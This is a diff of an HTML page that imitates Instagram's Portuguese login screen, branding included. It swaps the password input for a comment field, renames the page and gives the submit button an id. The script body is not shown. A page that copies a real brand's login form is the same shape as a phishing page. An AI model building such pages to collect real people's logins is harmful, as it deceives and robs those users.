@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram</title>
+    <title>Comentario Instagram</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -20,10 +20,10 @@
                     <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                     <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />
 
-                    <label for="password" class="sr-only">Senha</label>
-                    <input name="password" type="password" placeholder="Senha" />
+                    <label for="comentario" class="sr-only">Comentário</label>
+                    <input name="comentario" type="text" placeholder="Comentário" />
 
-                    <button type="button">Entrar</button>
+                    <button type="button" id="send">Entrar</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -67,7 +67,7 @@
         </ul>
         <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
-     <script>
+<script>
 document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById("send");
 
@@ -128,5 +128,6 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 </script>
+
 </body>
 </html>
